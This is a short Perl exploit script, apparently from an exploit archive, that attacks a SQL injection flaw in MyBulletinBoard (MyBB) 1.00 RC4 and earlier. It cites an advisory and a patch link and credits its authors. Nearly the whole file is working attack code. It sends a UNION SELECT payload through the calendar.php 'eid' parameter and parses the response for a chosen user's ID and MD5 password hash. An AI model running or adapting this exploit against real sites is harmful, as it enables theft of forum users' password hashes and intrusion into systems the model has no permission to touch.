#!/usr/bin/perl -w
#
# SQL Injection Exploit for MyBulletinBoard (MyBB) <= 1.00 RC4
# This exploit show the MD5 crypted password of the user id you've chose
# Related advisory:
http://www.securityfocus.com/archive/1/399491/2005-05-28/2005-06-03/0
# Patch: http://www.mybboard.com/community/showthread.php?tid=2559
# http://fain182.badroot.org
# http://www.codebug.org
# Discovered by Alberto Trivero and coded with FAiN182

use LWP::Simple;

print "\n\t===========================================\n";
print "\t= Exploit for MyBulletinBoard <= 1.00 RC4 =\n";
print "\t= Alberto Trivero & FAiN182 - codebug.org =\n";
print "\t===========================================\n\n";

if(!$ARGV[0] or !$ARGV[1]) {
   print "Usage:\nperl $0 [full_target_path] [user_id]\n\nExample:\nperl $0
http://www.example.com/mybb/ 1\n";
   exit(0);
}

$url =
"calendar.php?action=event&eid='%20UNION%20SELECT%20uid,uid,null,null,null,n
ull,password,null%20FROM%20mybb_users%20WHERE%20uid=$ARGV[1]/*";
$page = get($ARGV[0].$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $ARGV[0]\n";
$page =~ m/<td><strong>(.*?)<\/strong>/ && print "[+] User ID is: $1\n";
print "[-] Unable to retrieve User ID\n" if(!$1);
$page =~ m/<a href="member\.php\?action=profile&uid=">(.*?)<\/a>/ && print
"[+] MD5 hash of password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);
